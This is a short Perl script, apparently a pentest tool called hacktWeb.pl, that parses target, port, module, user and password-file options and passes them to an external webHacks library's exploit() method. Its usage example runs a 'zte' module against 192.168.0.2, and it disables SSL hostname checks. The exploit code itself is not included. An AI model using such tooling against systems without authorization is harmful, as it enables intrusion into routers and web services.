#!/usr/bin/perl
use Data::Dumper;
require webHacks;
use strict;
use Getopt::Std;

$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;

my %opts;
getopts('t:p:m:d:u:f:h', \%opts);


my $target = $opts{'t'} if $opts{'t'};
my $port = $opts{'p'} if $opts{'p'};
my $module = $opts{'m'} if $opts{'m'};
my $user = $opts{'u'} if $opts{'u'};
my $path = $opts{'d'} if $opts{'d'};
my $passwords_file = $opts{'f'} if $opts{'f'};

sub usage { 
  
  print "Uso:  \n";
  print "Autor: Daniel Torres Sandi \n";
  print "	Ejemplo 1:  hacktWeb.pl -t 192.168.0.2 -p 80 -m zte \n"; 
}	
# Print help message if required
if ($opts{'h'} || !(%opts)) {
	usage();
	exit 0;
}

my $ssl = 1;
if ($module eq "zte")
{
	$ssl = 0;
}
	   				   
my $webHacks = webHacks->new( rhost => $target,
						rport => $port,
						max_redirect => 1,
						ssl => $ssl,
					    debug => 0);
					    

# Need to make a request to discover if SSL is in use
#$webHacks->dispatch(url => "http://$target:$port".$path,method => 'GET');

$webHacks->exploit( module => $module, path => $path);
